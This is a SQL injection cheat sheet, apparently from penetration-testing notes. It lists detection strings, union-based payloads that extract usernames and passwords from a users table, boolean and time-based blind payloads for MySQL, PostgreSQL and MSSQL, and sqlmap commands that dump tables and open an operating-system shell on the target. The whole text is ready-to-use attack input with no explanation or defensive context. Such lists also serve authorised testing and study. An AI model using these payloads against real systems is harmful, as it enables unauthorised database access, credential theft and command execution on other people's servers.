### Detection

```
'
''
`
``
,
"
""
/
//
\
\\
;
' or '1'='1
' or 1=1--
" or 1=1--
```

### Union-Based

```sql
-- Find columns
' ORDER BY 1--
' ORDER BY 2--

-- Find injectable column
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extract data
' UNION SELECT username,password FROM users--

-- MySQL version
' UNION SELECT @@version--

-- Tables
' UNION SELECT table_name FROM information_schema.tables--
```

### Blind Boolean

```sql
' AND 1=1--   (true)
' AND 1=2--   (false)
' AND SUBSTRING(username,1,1)='a'--
```

### Time-Based Blind

```sql
-- MySQL
'; IF(1=1, SLEEP(5), 0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF 1=1 WAITFOR DELAY '0:0:5'--
```

### sqlmap

```bash
# Basic
sqlmap -u "http://<IP>/page?id=1" --dbs

# With cookie
sqlmap -u "http://<IP>/page" --cookie="session=abc" --dbs

# POST data
sqlmap -u "http://<IP>/login" --data="user=a&pass=b" --dbs

# Dump table
sqlmap -u "http://<IP>/?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://<IP>/?id=1" --os-shell
```

